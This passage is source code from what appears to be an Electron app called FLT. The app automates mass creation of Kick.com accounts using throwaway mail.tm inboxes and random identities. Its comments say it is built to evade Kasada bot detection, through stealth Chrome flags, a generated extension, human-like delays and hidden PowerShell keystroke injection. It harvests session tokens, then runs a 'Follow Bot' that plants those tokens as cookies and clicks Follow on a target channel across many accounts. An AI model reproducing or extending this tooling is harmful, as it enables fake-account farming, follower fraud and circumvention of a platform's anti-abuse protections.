      return eq > 0 ? c.slice(0, eq).trim() + '(' + (c.length - eq) + ')' : '';
    }).filter(Boolean);
    report('storage-ls: ' + lsKeys.join(' ').slice(0, 250));
    report('storage-ss: ' + ssKeys.join(' ').slice(0, 250));
    report('storage-ck: ' + ckKeys.join(' ').slice(0, 250));
  }
  async function postToken(token) {
    try {
      await fetch(SERVER + '/token', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ session: SESSION, token, url: location.href }),
      });
      return true;
    } catch (_) { return false; }
  }
  // No-op kept for call-site compatibility — the user-data-dir is fresh on
  // every run, so signing out is unnecessary.
  function flt_requestSignOut() {}

  async function step9_finishAndExtract() {
    // 9a — immediate scan of storage
    let tok = extractToken();
    if (tok) {
      report('token-found-instant');
      await postToken(tok);
      report('done');
      flt_requestSignOut();
      return true;
    }

    // 9b — quick poll for ~5 s in case Kick is still hydrating
    for (let i = 0; i < 10; i++) {
      tok = extractToken();
      if (tok) {
        report('token-found-storage');
        await postToken(tok);
        report('done');
        flt_requestSignOut();
        return true;
      }
      await sleep(500);
    }

    // 9c — Kick didn't put a Sanctum token in storage. Call /login API
    //      with the credentials we just used during signup to REQUEST one.
    report('asking-login-api-for-token');
    const loginToken = await requestTokenViaLogin();
    if (loginToken) {
      report('token-found-via-login-api');
      await postToken(loginToken);
      report('done');
      flt_requestSignOut();
      return true;
    }

    // 9d — Still nothing → dump storage for debugging, then keep polling
    dumpStorageKeys();

    for (let i = 0; i < 100; i++) {
      tok = extractToken();
      if (tok) {
        report('token-found-late');
        await postToken(tok);
        report('done');
        flt_requestSignOut();
        return true;
      }
      await sleep(500);
    }
    report('fail-no-token');
    return false;
  }

  // ── Main flow ──────────────────────────────────────────────────────────────
  (async () => {
    report('starting');
    // Longer initial wait — gives Kasada's JS challenge time to score the
    // session as a real organic visit, not a fast-acting automation. Real
    // users don't click Sign Up the moment the page paints.
    await sleep(rand(4500, 7500));

    if (!await step1_openModal())       { report('fail-open-modal'); return; }
    report('modal-open');

    await step2_ensureSignUpTab();
    report('on-signup-tab');

    if (!await step3_fillForm())        { report('fail-fill');        return; }
    report('form-filled');

    await sleep(700);
    if (!await step4_clickSubmit())     { report('fail-submit');      return; }
    report('submit-clicked');

    if (!await step5_typeCode())        { report('fail-code');        return; }
    report('code-typed');

    if (!await step6_scrollTerms())     { report('fail-terms-scroll'); /* keep going */ }
    else report('terms-scrolled');

    if (!await step7_clickAccept())     { report('fail-accept');      return; }
    report('accept-clicked');

    // After accept → 4 onboarding modals: Welcome / About / Gender / Country
    if (!await step8_onboarding())      { report('partial-onboarding'); /* keep going */ }
    else report('onboarding-done');

    // Token should be available now — extract and POST to FLT (which kills Chrome)
    await step9_finishAndExtract();
  })();
})();
`;
  fs.writeFileSync(path.join(rootDir, 'content.js'), contentJs);
  return rootDir;
}

async function kacCreateOne() {
  // 1. mail.tm — fetch a working domain, then create an inbox on it
  kacEmit('kick-creator-progress', { step: 'mail', msg: 'Requesting mail.tm domains…' });
  const domains = await kacMailGetDomains();
  if (!domains.length) throw new Error('No mail.tm domains available');
  const domain = kacRngPick(domains).domain;

  const localPart    = kacRandomLocalPart();
  const email        = `${localPart}@${domain}`;
  const password     = kacRandomPassword();
  // 8 candidate usernames — extension tries them in order, falling back
  // to the next if Kick says one is already taken.
  const usernamePool = kacRandomUsernameList(8);
  const kickUsername = usernamePool[0];
  const birthday     = kacRandomBirthday();

  kacEmit('kick-creator-progress', {
    step: 'creds',
    msg:  'Generated credentials — copy each one into Chrome',
    creds: { email, password, kickUsername, birthday: birthday.usa },
  });

  // Create the mail.tm account + grab the bearer token for /messages polling
  const accRes = await kacMailCreateAccount(email, password);
  if (accRes.status >= 400 && accRes.status !== 422) {
    throw new Error('mail.tm account creation failed: HTTP ' + accRes.status);
  }
  await kacSleep(700);
  const mailToken = await kacMailGetToken(email, password);
  if (!mailToken) throw new Error('mail.tm token request failed');

  // Bundle into the same { email, login, domain, token } shape the rest of
  // the pipeline already uses, so the background poller doesn't need changes
  // — kacBackgroundCodePoll reads `mailbox.token` for mail.tm auth.
  const mailbox = { email, login: localPart, domain, token: mailToken };

  kacEmit('kick-creator-progress', { step: 'mail', msg: 'Mailbox ready: ' + email });

  // 3. Spawn a fresh clean Chrome with our helper extension auto-loaded.
  //    The extension runs as content script on kick.com and:
  //      • clicks the Sign Up button itself
  //      • fills email, birthday, username, password
  //      • types the verification code when FLT pushes it
  //      • extracts the auth token after login
  //    Kasada sees a normal Chrome extension — there's no CDP, no
  //    --enable-automation, no Playwright surface to detect.
  const chromePath = kacFindChrome();
  if (!chromePath) {
    throw new Error(
      'Real chrome.exe not found. Install Google Chrome from ' +
      'https://www.google.com/chrome/  — Account Creator refuses to use Edge, ' +
      'Chromium, Electron or any other Chromium fork.'
    );
  }
  // Verify the binary path actually contains "Chrome" (defensive check
  // against future bugs that might let a non-Chrome path slip through)
  if (!/[\\/](google[\\s\\-]*chrome|chrome[\\s\\-]+sxs)/i.test(chromePath)) {
    throw new Error('Found browser is not Google Chrome: ' + chromePath);
  }
  // Fresh temp user-data-dir — Chrome treats it as a stand-alone install so
  // --load-extension is honored. Disposed of at the end of this account run.
  const userDataDir = path.join(
    app.getPath('temp'),
    'flt-kac-' + Date.now() + '-' + Math.floor(Math.random() * 1e6)
  );
  try { fs.mkdirSync(userDataDir, { recursive: true }); } catch (_) {}
  const tmpProfile = userDataDir; // legacy name retained for the cleanup code below
  const tmpExt = path.join(
    app.getPath('temp'),
    'flt-kac-ext-' + Date.now() + '-' + Math.floor(Math.random() * 1e6)
  );

  const sessionId = kacNewSessionId();

  // Ensure the local FLT↔extension bridge is up before Chrome launches
  kacStartServer();
  for (let i = 0; i < 30 && !_kacServerPort; i++) await kacSleep(50);
  if (!_kacServerPort) {
    throw new Error('Local bridge server failed to start');
  }

  // Generate the extension with this account's creds + server origin baked in
  kacBuildExtension(tmpExt, {
    email,
    password,
    kickUsername,
    usernamePool,
    birthdayIso: birthday.iso,
    birthdayUsa: birthday.usa,
  }, sessionId, kacServerOrigin());

  // Stealth Chrome flags
  // NOTE: We never pass --profile-directory because the copied profile is
  // saved as "Default" inside our temp user-data-dir, which Chrome picks
  // automatically. Combined with --user-data-dir, this ensures Chrome
  // launches as a stand-alone instance (no overlap with the user's running
  // Chrome) so --load-extension is honored.
  const chromeArgs = [
    '--user-data-dir=' + userDataDir,
    '--disable-features=' + [
      // Required to honor --load-extension on Chrome 137+
      'DisableLoadExtensionCommandLineSwitch',
      'IsolateOrigins',
      'site-per-process',
      'AutomationControlled',
      // Skip profile-picker / first-run / signin-intercept (would pause launch
      // and prevent --load-extension from being honored)
      'SigninInterceptBubbleV2',
    ].join(','),
    '--disable-blink-features=AutomationControlled',
    '--load-extension=' + tmpExt,
    '--no-first-run',
    '--no-default-browser-check',
    '--no-service-autorun',
    '--password-store=basic',
    '--disable-infobars',
    '--disable-popup-blocking',
    '--disable-translate',
    '--disable-fre',                 // disable first-run experience
    '--start-maximized',
    '--new-window',
    'https://kick.com/',
  ];

  kacEmit('kick-creator-progress', {
    step: 'browser',
    msg:  'Spawning real chrome.exe: ' + chromePath,
  });
  console.log('[KAC] Spawning Chrome:', chromePath);
  console.log('[KAC] Chrome args:', chromeArgs);

  const { spawn } = require('child_process');
  const chromeProc = spawn(chromePath, chromeArgs, {
    detached: false, stdio: 'ignore', windowsHide: false,
  });
  KAC.chromeProc = chromeProc;

  // 4. Pending session
  const pending = {
    sessionId, email, password,
    username:  kickUsername,
    birthday:  birthday.usa,
    mailbox,                       // { email, login, domain } — for 1secmail polling
    tmpProfile, tmpExt,
    chromeProc,
    createdAt: Date.now(),
    resolve: null, reject: null, timer: null,
  };
  KAC_PENDING.set(sessionId, pending);

  kacEmit('kick-creator-progress', {
    step: 'await', type: 'info', sessionId,
    msg:  '🤖 Auto-flow running — waiting for extension heartbeat…',
    creds: { email, password, kickUsername, birthday: birthday.usa },
  });

  // ── Heartbeat watchdog — warn loudly if the extension never loads ────────
  setTimeout(() => {
    const p = KAC_PENDING.get(sessionId);
    if (!p || p.heartbeat) return;   // already heard from
    kacEmit('kick-creator-progress', {
      step: 'warn', type: 'warn', sessionId,
      msg:  '⚠ Extension never loaded. Open chrome://extensions in the Chrome that just spawned, ' +
            'toggle "Developer mode" ON (top-right), then click Stop in FLT and try again. ' +
            'If still failing, your Chrome may be too old for --load-extension (requires v111+).',
    });
  }, 10000);

  // 5. Background 1secmail poller (5-minute window)
  kacBackgroundCodePoll(sessionId, mailbox, 300000).catch(() => {});

  // 6. Wait for token / skip / stop / timeout
  let account;
  try {
    account = await new Promise((resolve, reject) => {
      pending.resolve = resolve;
      pending.reject  = reject;
      pending.timer = setTimeout(() => {
        KAC_PENDING.delete(sessionId);
        reject(new KacSkipError('Timed out after 15 minutes — no token received'));
      }, 15 * 60 * 1000);
    });
  } finally {
    // The user-data-dir is ALWAYS disposable now (in profile-mode it's a
    // COPY of the user's real profile, not the original). Safe to wipe.
    setTimeout(() => {
      try { chromeProc.kill('SIGTERM'); } catch (_) {}
      setTimeout(() => { try { chromeProc.kill('SIGKILL'); } catch (_) {} }, 1500);
      try { fs.rmSync(tmpProfile, { recursive: true, force: true }); } catch (_) {}
      try { fs.rmSync(tmpExt,    { recursive: true, force: true }); } catch (_) {}
      if (KAC.chromeProc === chromeProc) KAC.chromeProc = null;
    }, 800);
  }

  // 7. Persist + emit
  kacAppendFile(account.email, account.password, account.token);
  kacEmit('kick-creator-account', account);
  kacEmit('kick-creator-progress', {
    step: 'ok', type: 'ok',
    msg: 'Account saved: ' + (account.username || account.email),
  });

  return account;
}

// ── IPC: start / stop ─────────────────────────────────────────────────────────
ipcMain.handle('kick-creator-start', async (_e, opts) => {
  if (KAC.running) return { ok: false, error: 'Already running' };
  const count         = Math.max(1, Math.min(50, parseInt((opts && opts.count) || 1, 10) || 1));
  const gapMs         = Math.max(0, parseInt((opts && opts.gapMs) || 10000, 10) || 0);
  fltLog.log(fltLog.ACTIONS.KAC_RUN, { count, gap_ms: gapMs }, 'info',
    `Account Creator started: ${count} accounts`);
  // Safety: don't loop forever burning mailboxes
  const maxSkips = Math.max(count * 5, 25);

  KAC.running = true;
  KAC.abort   = false;
  const created = [];
  let skips = 0;
  try {
    while (created.length < count) {
      if (KAC.abort) break;
      if (skips >= maxSkips) {
        kacEmit('kick-creator-progress', {
          step: 'warn', type: 'warn',
          msg: `Stopped — ${maxSkips} mailboxes burned without success. Kick is hard-blocking right now.`,
        });
        break;
      }
      kacEmit('kick-creator-progress', {
        step: 'cycle',
        msg: `Account ${created.length + 1} / ${count}${skips ? `  (${skips} skipped)` : ''}…`,
        index: created.length, total: count, skipped: skips,
      });

      try {
        const acc = await kacCreateOne();
        if (acc) created.push(acc);
      } catch (err) {
        const isSkip = err && err.skip === true;
        const msg = err && err.message ? err.message : String(err);
        if (isSkip) {
          skips++;
          kacEmit('kick-creator-progress', {
            step: 'skip', type: 'warn',
            msg: `↷ Skipped — ${msg}`,
          });
          if (!KAC.abort && created.length < count) await kacSleep(Math.min(gapMs, 5000));
          continue;
        }
        kacEmit('kick-creator-progress', {
          step: 'error', type: 'err',
          msg: `Account failed: ${msg}`,
        });
      }
      if (created.length < count && !KAC.abort) await kacSleep(gapMs);
    }

    kacEmit('kick-creator-progress', {
      step: 'done', type: created.length ? 'ok' : 'warn',
      msg: `Finished — ${created.length} / ${count} created${skips ? `  (${skips} skipped)` : ''}.`,
    });
    return { ok: true, created, skipped: skips };
  } finally {
    KAC.running = false;
    KAC.abort   = false;
  }
});

ipcMain.handle('kick-creator-stop', async () => {
  KAC.abort = true;
  // Close any open BrowserWindow
  try { if (KAC.win && !KAC.win.isDestroyed()) KAC.win.close(); } catch (_) {}
  KAC.win = null;
  // Reject any pending account-waiters (legacy manual-mode flow)
  for (const [, p] of KAC_PENDING) {
    if (p && p.reject) {
      try { clearTimeout(p.timer); } catch (_) {}
      try { p.reject(new Error('Stopped by user')); } catch (_) {}
    }
  }
  KAC_PENDING.clear();
  return { ok: true };
});

// Renderer posts the auth token the user pasted from the real Chrome window.
// We validate by calling Kick's GET /api/v2/channels/me with the bearer.
ipcMain.handle('kick-creator-save-token', async (_e, payload) => {
  const sessionId = payload && payload.sessionId;
  const rawToken  = String((payload && payload.token) || '').trim().replace(/^Bearer\s+/i, '');
  if (!sessionId || !rawToken) return { ok: false, error: 'Missing sessionId or token' };
  const p = KAC_PENDING.get(sessionId);
  if (!p) return { ok: false, error: 'Session not found (already saved or cancelled)' };
  if (rawToken.length < 20) return { ok: false, error: 'Token looks too short — paste the full JWT' };

  // Optional validation against Kick (best-effort; do not block save if it fails)
  let kickUid = null, kickUsername = null;
  try {
    kickUid = await new Promise((resolve) => {
      const req = https.request({
        method: 'GET',
        hostname: 'kick.com',
        path: '/api/v1/user',
        headers: {
          authorization: 'Bearer ' + rawToken,
          accept:        'application/json',
          'user-agent':  CHROME_UA,
        },
        timeout: 8000,
      }, (res) => {
        let d = '';
        res.on('data', (c) => d += c);
        res.on('end', () => {
          try {
            const j = JSON.parse(d || '{}');
            if (j && j.username) { kickUsername = j.username; resolve(j.id || j.user_id || null); }
            else resolve(null);
          } catch { resolve(null); }
        });
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { try { req.destroy(); } catch (_) {} resolve(null); });
      req.end();
    });
  } catch (_) {}

  try { clearTimeout(p.timer); } catch (_) {}
  // Close this account's Chrome window so a fresh one opens for the next.
  try { if (p.chromeProc) p.chromeProc.kill('SIGTERM'); } catch (_) {}
  KAC_PENDING.delete(sessionId);

  const account = {
    email:    p.email,
    password: p.password,
    username: kickUsername || p.username,
    uid:      kickUid || null,
    token:    rawToken,
    createdAt: Date.now(),
  };
  if (p.resolve) p.resolve(account);
  return { ok: true, validated: !!kickUsername, account };
});

// Renderer wants to know the active pending session(s) — used for UI restoration
ipcMain.handle('kick-creator-list-pending', async () => {
  return Array.from(KAC_PENDING.values()).map((p) => ({
    sessionId: p.sessionId,
    email:     p.email,
    username:  p.username,
    createdAt: p.createdAt,
  }));
});

// ── OS-level keyboard typing (Win32 SendInput via PowerShell SendKeys) ──────
// Kasada cannot detect this because the events come from the OS input
// subsystem, identical to a real human pressing keys.
function kacOsTypeText(text) {
  return new Promise((resolve) => {
    if (process.platform !== 'win32') return resolve(false);
    // PowerShell single-quote escape (double the quote)
    const escaped = String(text).replace(/'/g, "''");
    const psScript =
      "Add-Type -AssemblyName System.Windows.Forms;" +
      "$text='" + escaped + "';" +
      "$special=@('+','^','%','~','(',')','{','}','[',']');" +
      "foreach ($ch in $text.ToCharArray()) {" +
      "  $cs=[string]$ch;" +
      "  if ($special -contains $cs) {" +
      "    [System.Windows.Forms.SendKeys]::SendWait('{'+$cs+'}')" +
      "  } else {" +
      "    [System.Windows.Forms.SendKeys]::SendWait($cs)" +
      "  }" +
      "  Start-Sleep -Milliseconds (Get-Random -Minimum 55 -Maximum 130)" +
      "}";
    const { spawn } = require('child_process');
    const ps = spawn('powershell.exe', ['-NoProfile', '-WindowStyle', 'Hidden', '-Command', psScript], {
      windowsHide: true,
    });
    ps.on('close', () => resolve(true));
    ps.on('error', () => resolve(false));
  });
}

function kacOsSendKey(key) {
  return new Promise((resolve) => {
    if (process.platform !== 'win32') return resolve(false);
    const psScript =
      "Add-Type -AssemblyName System.Windows.Forms;" +
      "[System.Windows.Forms.SendKeys]::SendWait('" + key.replace(/'/g, "''") + "')";
    const { spawn } = require('child_process');
    const ps = spawn('powershell.exe', ['-NoProfile', '-WindowStyle', 'Hidden', '-Command', psScript], {
      windowsHide: true,
    });
    ps.on('close', () => resolve(true));
    ps.on('error', () => resolve(false));
  });
}

// Auto-fill the Kick signup form in whatever window currently has focus.
// The user clicks into the email field FIRST, then triggers this from FLT.
ipcMain.handle('kick-creator-autofill', async (_e, payload) => {
  const sessionId = payload && payload.sessionId;
  if (!sessionId) return { ok: false, error: 'Missing sessionId' };
  const p = KAC_PENDING.get(sessionId);
  if (!p) return { ok: false, error: 'No active session — start a new one first' };
  if (process.platform !== 'win32') {
    return { ok: false, error: 'OS auto-fill only supported on Windows' };
  }

  try {
    // 1. Email
    await kacOsTypeText(p.email);
    await kacSleep(180);
    await kacOsSendKey('{TAB}');
    await kacSleep(220);

    // 2. Birthday — strip slashes so it works with Chrome's <input type="date">
    //    Chrome's date input parses 8 digits as MMDDYYYY automatically.
    const bday = String(p.birthday || '').replace(/\D/g, '');
    if (bday.length === 8) {
      await kacOsTypeText(bday);
    } else {
      await kacOsTypeText(p.birthday);
    }
    await kacSleep(180);
    await kacOsSendKey('{TAB}');
    await kacSleep(220);

    // 3. Username
    await kacOsTypeText(p.username);
    await kacSleep(180);
    await kacOsSendKey('{TAB}');
    await kacSleep(220);

    // 4. Password
    await kacOsTypeText(p.password);

    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message || String(e) };
  }
});

// Auto-type the verification code into the currently focused input.
ipcMain.handle('kick-creator-autofill-code', async (_e, payload) => {
  const code = String((payload && payload.code) || '').trim();
  if (!code) return { ok: false, error: 'No code provided' };
  if (process.platform !== 'win32') {
    return { ok: false, error: 'OS auto-fill only supported on Windows' };
  }
  try {
    await kacOsTypeText(code);
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message || String(e) };
  }
});

// Renderer triggers a skip — current session burned, move to the next account
ipcMain.handle('kick-creator-skip-session', async (_e, payload) => {
  const sessionId = payload && payload.sessionId;
  if (!sessionId) return { ok: false, error: 'Missing sessionId' };
  const p = KAC_PENDING.get(sessionId);
  if (!p) return { ok: false, error: 'Session not found' };
  try { clearTimeout(p.timer); } catch (_) {}
  // Kill this account's Chrome so the next iteration opens a fresh tab
  try { if (p.chromeProc) p.chromeProc.kill('SIGTERM'); } catch (_) {}
  KAC_PENDING.delete(sessionId);
  if (p.reject) p.reject(new KacSkipError(payload.reason || 'User skipped'));
  return { ok: true };
});

ipcMain.handle('kick-creator-open-file', async () => {
  try { shell.showItemInFolder(KAC.out); } catch (_) {}
  return { ok: true, path: KAC.out };
});

// ── END KICK ACCOUNT CREATOR ─────────────────────────────────────────────────


// ══════════════════════════════════════════════════════════════════════════════
//  FOLLOW BOT — Click Mode (no Kasada solver needed)
//  Spawns real Chrome per account with a small extension that:
//    1. Logs into kick.com via /api/v2/login (or token-restore fallback)
//    2. Navigates to https://kick.com/<channelSlug>
//    3. Clicks the green Follow button
//    4. POSTs the result back to FLT, Chrome closes, next account runs
//  Kasada doesn't trip because nothing about this looks like automation —
//  real Chrome solves the JS challenge during normal page load.
// ══════════════════════════════════════════════════════════════════════════════

const FBC = { running: false, abort: false, chromeProc: null };
const FBC_PENDING = new Map();
function fbcNewSessionId() { return 'fbc-' + Date.now() + '-' + Math.floor(Math.random() * 1e6); }

function fbcEmit(channel, data) {
  if (mainWin && !mainWin.isDestroyed()) mainWin.webContents.send(channel, data);
}

function fbcBuildExtension(rootDir, params, sessionId, serverOrigin) {
  fs.mkdirSync(rootDir, { recursive: true });

  // ── manifest.json — token-injection style (matches the proven FLT Login ext)
  //    + declarativeNetRequest to BLOCK video/HLS segments at network level.
  //    Without this, kick.com autoplays the live stream and caches hundreds
  //    of MB per account → fills the user's C: drive across many runs.
  const manifest = {
    manifest_version: 3,
    name: 'FLT Follow Helper',
    version: '1.0',
    description: 'Token-injection follow helper',
    permissions: ['cookies', 'storage', 'tabs', 'scripting', 'declarativeNetRequest'],
    host_permissions: [
      'https://kick.com/*',
      'https://*.kick.com/*',
      'http://127.0.0.1/*',
      'http://localhost/*',
    ],
    background: { service_worker: 'background.js' },
    content_scripts: [{
      matches: ['https://kick.com/*', 'https://*.kick.com/*'],
      js: ['content.js'],
      run_at: 'document_start',
    }],
    declarative_net_request: {
      rule_resources: [{
        id: 'flt_block_media',
        enabled: true,
        path: 'rules.json',
      }],
    },
  };
  fs.writeFileSync(path.join(rootDir, 'manifest.json'), JSON.stringify(manifest, null, 2));

  // ── rules.json — block all video/HLS/audio segment downloads. We don't
  //    need to PLAY the stream to click Follow; blocking these saves GB.
  const rules = [
    { id: 1, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.m3u8', resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 2, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.ts',   resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 3, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.mp4',  resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 4, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.aac',  resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 5, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.fmp4', resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 6, priority: 1, action: { type: 'block' }, condition: { urlFilter: '*.m4s',  resourceTypes: ['xmlhttprequest', 'media', 'other'] } },
    { id: 7, priority: 1, action: { type: 'block' }, condition: { requestDomains: ['stream.kick.com'] } },
    { id: 8, priority: 1, action: { type: 'block' }, condition: { requestDomains: ['video.kick.com'] } },
    { id: 9, priority: 1, action: { type: 'block' }, condition: { requestDomains: ['cdn-video.kick.com'] } },
  ];
  fs.writeFileSync(path.join(rootDir, 'rules.json'), JSON.stringify(rules, null, 2));

  // ── background.js — sets the Kick auth cookies + navigates to the channel
  //    This is what actually logs the account in. Kick accepts the raw
  //    Sanctum token as the value of BOTH `session_token` and `kick_session`
  //    cookies — when the page loads with these set, Kick's server-side
  //    session check finds them and treats the request as authenticated.
  const backgroundJs =
`const TOKEN   = ${JSON.stringify(params.token)};
const CHANNEL = ${JSON.stringify(params.channel)};
const SESSION = ${JSON.stringify(sessionId)};
const SERVER  = ${JSON.stringify(serverOrigin)};

function report(status, extra) {
  try {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(Object.assign({ session: SESSION, status, url: 'bg' }, extra || {})),
    });
  } catch (_) {}
}

async function setKickCookies(token) {
  const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days
  for (const name of ['session_token', 'kick_session']) {
    try {
      await chrome.cookies.set({
        url:    'https://kick.com',
        domain: '.kick.com',
        name,
        value:  token,
        path:   '/',
        secure: true,
        sameSite: 'lax',
        expirationDate: exp,
      });
    } catch (_) {}
  }
}

async function bootstrap() {
  report('bg-starting');
  if (!TOKEN || !CHANNEL) { report('bg-no-token'); return; }

  // Stash for content.js to read at document_start
  await chrome.storage.local.set({
    flt_token: TOKEN, flt_channel: CHANNEL,
    flt_session: SESSION, flt_server: SERVER,
  });

  // ⭐ Plant the auth cookies BEFORE any kick.com page loads
  await setKickCookies(TOKEN);
  report('bg-cookies-set');

  // Find a tab to navigate (Chrome was spawned with about:blank)
  const tabs = await chrome.tabs.query({});
  const target = 'https://kick.com/' + CHANNEL;
  if (tabs.length > 0) {
    await chrome.tabs.update(tabs[0].id, { url: target, active: true });
  } else {
    await chrome.tabs.create({ url: target, active: true });
  }
  report('bg-navigating-to-' + CHANNEL);
}

bootstrap();
`;
  fs.writeFileSync(path.join(rootDir, 'background.js'), backgroundJs);

  // ── content.js — runs at document_start on every kick.com page
  //    1. Plants the token in localStorage before the SPA boots
  //    2. After DOMContentLoaded, finds the Follow button and clicks it
  const contentJs =
`(async function() {
  // Plant token into localStorage as early as possible (Kick's SPA reads it on boot)
  let cfg = {};
  try { cfg = await chrome.storage.local.get(['flt_token','flt_channel','flt_session','flt_server']); } catch (_) {}
  if (cfg.flt_token) {
    try {
      localStorage.setItem('kick_token', cfg.flt_token);
      localStorage.setItem('token',      cfg.flt_token);
    } catch (_) {}
  }

  // Only run the click-flow once per tab
  if (window.__FLT_FBC_RAN) return;
  window.__FLT_FBC_RAN = true;

  const TOKEN   = cfg.flt_token;
  const CHANNEL = cfg.flt_channel;
  const SESSION = cfg.flt_session;
  const SERVER  = cfg.flt_server;
  if (!TOKEN || !CHANNEL || !SESSION || !SERVER) return;

  // Initial heartbeat so FLT knows the extension is alive on this page
  fetch(SERVER + '/follow-status', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ session: SESSION, status: 'loaded', url: location.href }),
  }).catch(() => {});

  // ── Helpers ───────────────────────────────────────────────────────────────
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  function visible(el) {
    if (!el) return false;
    const r = el.getBoundingClientRect();
    if (!r.width || !r.height) return false;
    const cs = getComputedStyle(el);
    return cs.display !== 'none' && cs.visibility !== 'hidden' && cs.opacity !== '0';
  }
  function realClick(el) {
    if (!el) return;
    try {
      const r = el.getBoundingClientRect();
      const x = r.left + r.width / 2;
      const y = r.top + r.height / 2;
      el.focus && el.focus();
      el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('mouseup',   { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('click',     { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
    } catch (_) {}
    try { el.click(); } catch (_) {}
  }
  async function waitFor(fn, timeoutMs, pollMs) {
    const t0 = Date.now();
    while (Date.now() - t0 < timeoutMs) {
      const v = fn();
      if (v) return v;
      await sleep(pollMs || 300);
    }
    return null;
  }
  function report(status) {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ session: SESSION, status, url: location.href }),
    }).catch(() => {});
    try { document.title = '[FLT-FBC:' + status + '] ' + document.title.replace(/^\\[FLT-FBC:[^\\]]+\\] /, ''); } catch (_) {}
  }
  function done(success, info) {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        session: SESSION,
        status:  success ? 'done' : 'fail',
        info, url: location.href,
      }),
    }).catch(() => {});
  }

  function findFollowButton() {
    return Array.from(document.querySelectorAll('button, [role="button"], a'))
      .filter(visible)
      .find(b => /^\\s*follow\\s*$/i.test((b.textContent || '').trim()));
  }
  function findFollowingIndicator() {
    // Kick flips the button to one of several states after a successful follow:
    //   "Following" · "Unfollow" · "Following ✓" · sometimes just an icon
    // Match anything that means the follow took effect.
    const els = Array.from(document.querySelectorAll('button, [role="button"], a, span'))
      .filter(visible);
    return els.find((b) => {
      const t = (b.textContent || '').trim().replace(/\\s+/g, ' ');
      if (!t || t.length > 30) return false;
      return /^(following|unfollow|followed|✓\\s*following)$/i.test(t);
    });
  }

  // ── Verify the follow actually took — three signals, ANY of them = success
  function checkFollowed() {
    if (findFollowingIndicator()) return 'indicator';
    if (!findFollowButton())      return 'button-gone';
    return null;
  }

  // ── Authoritative verification: ask Kick directly which channels we follow.
  //    GET /api/v2/channels/followed returns the list — if our slug is in it,
  //    the follow is 100% confirmed on Kick's backend.
  //    Returns:  true  = confirmed following
  //              false = response was OK but our channel is NOT in the list
  //              null  = couldn't get a clear answer (network / parse error)
  async function isFollowedViaApi() {
    try {
      const r = await fetch('/api/v2/channels/followed', {
        credentials: 'include',
        headers:     { accept: 'application/json', 'x-app-platform': 'web' },
      });
      if (!r.ok) return null;
      const j = await r.json().catch(() => null);
      if (!j) return null;
      const list =
        Array.isArray(j)            ? j :
        Array.isArray(j.data)       ? j.data :
        Array.isArray(j.channels)   ? j.channels :
        Array.isArray(j.followed)   ? j.followed :
        Array.isArray(j['hydra:member']) ? j['hydra:member'] :
        [];
      if (!Array.isArray(list)) return false;
      const target = String(CHANNEL).toLowerCase();
      return list.some((item) => {
        if (!item) return false;
        const slugs = [
          item.slug, item.username, item.name,
          item.channel && item.channel.slug,
          item.channel && item.channel.username,
          item.user    && item.user.username,
          item.user    && item.user.slug,
        ];
        return slugs.some((s) => typeof s === 'string' && s.toLowerCase() === target);
      });
    } catch (_) { return null; }
  }

  // Poll the API until we see our channel in the followed list (or timeout).
  async function pollApiForFollow(maxMs, pollMs) {
    const t0 = Date.now();
    let nullStreak = 0;
    while (Date.now() - t0 < maxMs) {
      const res = await isFollowedViaApi();
      if (res === true) return true;
      if (res === null) {
        nullStreak++;
        if (nullStreak >= 3) return null; // give up if the API itself is broken
      } else {
        nullStreak = 0;
      }
      await sleep(pollMs);
    }
    return false;
  }

  // ── Main flow — token cookies are ALREADY set by background.js,
  //    so by the time the channel page reaches us here, the user is logged in.
  //
  //    After clicking Follow, we verify the click registered. If it didn't,
  //    we reload the page and try again (up to MAX_ATTEMPTS total). The
  //    attempt counter is stored in sessionStorage so it survives the reload.
  async function run() {
    report('starting');

    // Only act on the actual channel page (content.js also runs on
    // about:blank → kick.com redirect, where there's nothing to click yet)
    const channelPathRe = new RegExp('^/' + CHANNEL.replace(/[.*+?^\${}()|[\\]\\\\]/g, '\\\\$&') + '(/|$)');
    if (!channelPathRe.test(location.pathname)) {
      report('waiting-for-channel-page');
      return;
    }

    const ATTEMPT_KEY = '__flt_fbc_attempt';
    const MAX_ATTEMPTS = 3;
    let attempt = parseInt(sessionStorage.getItem(ATTEMPT_KEY) || '1', 10);
    if (!Number.isFinite(attempt) || attempt < 1) attempt = 1;

    report('attempt-' + attempt + '-of-' + MAX_ATTEMPTS);

    // Wait for the Nuxt/Inertia SPA to hydrate
    await sleep(attempt === 1 ? 3000 : 4000);

    // ─ 1. Already following? Authoritative API check first. ─────────────────
    const apiPre = await isFollowedViaApi();
    if (apiPre === true) {
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(true, 'already-following-per-api');
      return;
    }
    if (findFollowingIndicator()) {
      // DOM says following — confirm with API before closing
      const apiConfirm = await isFollowedViaApi();
      if (apiConfirm === true) {
